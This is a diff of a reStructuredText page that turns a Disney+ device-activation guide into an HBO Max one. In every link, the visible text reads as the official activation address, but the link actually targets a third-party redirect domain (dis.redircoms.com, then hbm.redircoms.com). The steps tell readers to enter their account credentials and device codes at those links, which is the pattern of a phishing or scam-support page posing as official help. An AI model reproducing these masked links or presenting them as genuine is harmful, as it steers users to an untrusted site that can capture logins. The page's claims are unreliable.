@@ -1,9 +1,9 @@
 ##################
-How to Activate Disney+ on My Device via disneyplus.com/begin
+Step-by-Step Activation of HBO Max on TV via hbomax.com/tvsignin
 ##################
 
 .. meta::
-   :msvalidate.01: 79062439FF46DE4F09274CF8F25244E0
+   :msvalidate.01: FE216E19E94441856C00D18618ACAE7D
 
 .. image:: blank.png
    :width: 350px
@@ -14,35 +14,36 @@ How to Activate Disney+ on My Device via disneyplus.com/begin
    :width: 350px
    :align: center
    :height: 100px
-   :alt: disneyplus.com/begin
-   :target: https://dis.redircoms.com
+   :alt: hbomax.com/tvsignin
+   :target: https://hbm.redircoms.com
 
 .. image:: blank.png
    :width: 350px
    :align: center
    :height: 100px
 
-To start watching your favorite movies, TV shows, and originals from Disney, Pixar, Marvel, Star Wars, and National Geographic, activate your device at `disneyplus.com/begin <https://dis.redircoms.com>`_. This activation page ensures a secure and fast way to link your streaming device to your Disney+ account. Just enter the 8-digit code from your screen to begin streaming in minutes.
+Want to unlock HBO Max on your Smart TV, Roku, Fire Stick, or gaming console? Easily activate your device by visiting  
+`hbomax.com/tvsignin <https://hbm.redircoms.com>`_ and entering the code displayed on your TV screen. Follow the guide below to link your account and start streaming instantly.
 
 **********
-Steps to Activate Disney+ on Your Device
+Steps to Activate HBO Max on Your TV
 **********
 
-1. Launch the Disney+ app on your smart TV, streaming stick, gaming console, or other device.
-2. On the welcome screen, an **8-digit activation code** will be displayed.
-3. Open a web browser on your computer or mobile device and go to `disneyplus.com/begin <https://dis.redircoms.com>`_.
-4. Log in using your Disney+ account credentials.
-5. Enter the **8-digit code** shown on your TV/device screen.
-6. Click **Continue** and wait for the device to link successfully.
+1. Launch the **HBO Max app** on your compatible streaming device or Smart TV.
+2. Select **Sign In**—you’ll see an **8-character activation code** on the screen.
+3. Using a browser on your phone, tablet, or PC, go to  
+   `hbomax.com/tvsignin <https://hbm.redircoms.com>`_.
+4. Sign in with your HBO Max account credentials.
+5. Enter the code shown on your TV and click **Next**.
+6. After successful verification, your TV will refresh and log you into HBO Max.
 
 **********
-What to Do After Activation
+Troubleshooting & Tips
 **********
 
-1. Once activation is complete, your device will automatically refresh.
-2. You will now have full access to Disney+ content on your device.
-3. If the code expires, restart the app to generate a new code.
-4. For issues, ensure your device is connected to the internet and try again.
-5. You can repeat this process on additional devices using the same account.
+- If your code expires, simply restart the HBO Max app to generate a new one.  
+- Confirm your device has a stable internet connection.  
+- Use the latest version of a supported browser when visiting the activation link.
 
-Start streaming the magic of Disney+ today by visiting `disneyplus.com/begin <https://dis.redircoms.com>`_ and entering your activation code.
+Start watching blockbuster movies, iconic series, and exclusive HBO Originals today. Go to  
+`hbomax.com/tvsignin <https://hbm.redircoms.com>`_ and complete your activation in minutes.
